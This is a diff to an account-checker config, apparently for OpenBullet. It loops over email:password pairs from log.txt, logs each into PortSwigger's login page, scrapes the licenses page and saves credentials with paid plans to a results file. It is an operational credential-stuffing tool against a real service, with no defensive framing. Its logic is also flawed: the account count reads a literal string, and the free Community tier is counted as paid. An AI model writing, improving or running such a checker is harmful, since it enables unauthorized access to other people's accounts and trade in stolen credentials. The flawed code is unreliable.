@@ -1,51 +1,86 @@
 ## PortSwigger Subscription Extraction
 ## Reads accounts from log.txt and extracts subscription information
-## Version: Test first account with corrected variable substitution
+## Processes all accounts and outputs paid subscriptions
 
 FileReadLines "log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-## Extract first account credentials
-SET VAR "account" $"<accounts[0]>"
-Split $"<account>" ":" -> VAR "creds"
-SET VAR "email" $"<creds[0]>"
-SET VAR "password" $"<creds[1]>"
+## Create label for loop iteration
+#PROCESS_ACCOUNT
 
-PRINT "Testing account: <email>" White
+## Get total account count using JavaScript
+BEGIN SCRIPT Jint
+  var count = "accounts".split('\n').length;
+  return Math.max(0, count - 1);
+END SCRIPT -> VARS "totalAccounts"
 
-## Step 1: GET login page to establish session
-HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
-SET VAR "loginPageRes" $"<SOURCE>"
-PRINT "Step 1 - Login page fetched" White
+## Initialize counter and results storage
+SET VAR "accountIndex" "0" Integer
+SET VAR "successCount" "0" Integer
 
-## Step 2: POST login credentials with form data containing email and password
-HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
-  CONTENT "username=<email>&password=<password>&action=default"
-  CONTENTTYPE "application/x-www-form-urlencoded"
-SET VAR "loginRes" $"<SOURCE>"
-PRINT "Step 2 - Credentials posted" White
+## Initialize results file
+FileWrite "Configs\extraction_results.txt" "email:password:plan"
 
-## Step 3: GET licenses page (cookies should be preserved from login)
-HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
-SET VAR "licensesRes" $"<SOURCE>"
-PRINT "Step 3 - Licenses page fetched" White
+## Process each account
+IF $"<accountIndex>" LessThan $"<accounts[*]>"
+  ## Extract account credentials
+  SET VAR "account" $"<accounts[<accountIndex>]>"
+  Split $"<account>" ":" -> VAR "creds"
+  SET VAR "email" $"<creds[0]>"
+  SET VAR "password" $"<creds[1]>"
 
-## Check for subscription types
-IF $"<licensesRes>" Contains "Professional"
-  PRINT "FOUND: <email> has Professional subscription" Green
-ELSE
-  IF $"<licensesRes>" Contains "Community"
-    PRINT "FOUND: <email> has Community subscription" Green
+  PRINT "[<accountIndex>] Processing: <email>" White
+
+  ## Step 1: GET login page
+  HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
+  SET VAR "loginPageRes" $"<SOURCE>"
+
+  ## Step 2: POST login credentials
+  HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
+    CONTENT "username=<email>&password=<password>&action=default"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+  SET VAR "loginRes" $"<SOURCE>"
+
+  ## Step 3: GET licenses page
+  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
+  SET VAR "licensesRes" $"<SOURCE>"
+
+  ## Extract subscription plan
+  SET VAR "plan" ""
+
+  IF $"<licensesRes>" Contains "Professional"
+    SET VAR "plan" "Professional"
   ELSE
-    IF $"<licensesRes>" Contains "subscription"
-      PRINT "FOUND: <email> has some subscription" Green
+    IF $"<licensesRes>" Contains "Community"
+      SET VAR "plan" "Community"
     ELSE
-      PRINT "NO: <email> has no paid subscription" Yellow
+      IF $"<licensesRes>" Contains "Enterprise"
+        SET VAR "plan" "Enterprise"
+      ENDIF
     ENDIF
   ENDIF
+
+  ## Write result if paid subscription found
+  IF $"<plan>" NotEqualTo ""
+    FileAppendLines "Configs\extraction_results.txt"
+      "<email>:<password>:<plan>"
+    SUM $"<successCount>" -> VAR "successCount"
+    PRINT "✓ <email> - <plan>" Green
+  ELSE
+    PRINT "✗ <email> - no paid plan" Yellow
+  ENDIF
+
+  ## Increment counter
+  SUM $"<accountIndex>" -> VAR "accountIndex"
+
+  ## Add delay between requests
+  Delay 500
+
+  ## Jump back to loop if more accounts remain
+  IF $"<accountIndex>" LessThan $"<accounts[*]>"
+    JUMP #PROCESS_ACCOUNT
+  ENDIF
+
 ENDIF
 
-## Debug: show response length
-PRINT "Response length: " White
-
-PRINT "Test complete" White
+PRINT "Done: <successCount> paid accounts extracted" Green
